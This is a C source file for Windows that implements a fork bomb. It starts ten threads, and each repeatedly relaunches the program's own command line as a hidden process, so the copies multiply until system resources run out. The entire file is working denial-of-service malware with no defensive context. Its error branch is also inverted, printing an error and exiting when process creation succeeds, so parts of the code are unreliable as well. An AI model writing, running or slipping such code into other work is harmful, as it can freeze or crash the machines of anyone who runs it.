#include <windows.h>
#include <stdio.h>
#include <time.h>

#define NUM_THREADS 10

DWORD WINAPI ForkThread(LPVOID param){
    while (1){
        STARTUPINFO si = { 0 };
        PROCESS_INFORMATION pi;
        if (CreateProcess(NULL, GetCommandLine(),NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi)){
            printf("[!] Error:%lu\n",GetLastError());

            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);

            exit(1);
        }
    }
    return 0;
}

void ForkBomb(){
    HANDLE hThreads[NUM_THREADS];

    for (int i=0; i < NUM_THREADS; i++){
        hThreads[i] = CreateThread(NULL,0,ForkThread,NULL,0,NULL);
        if (!hThreads[i]){
            printf("[!] Thread Creation Error:%lu\n",GetLastError());
            exit(1);
        }

        Sleep(10);
    }
    WaitForMultipleObjects(NUM_THREADS, hThreads, TRUE, INFINITE);
}

int main(int argc,char* argv[]){
    ForkBomb();
    return 0;
}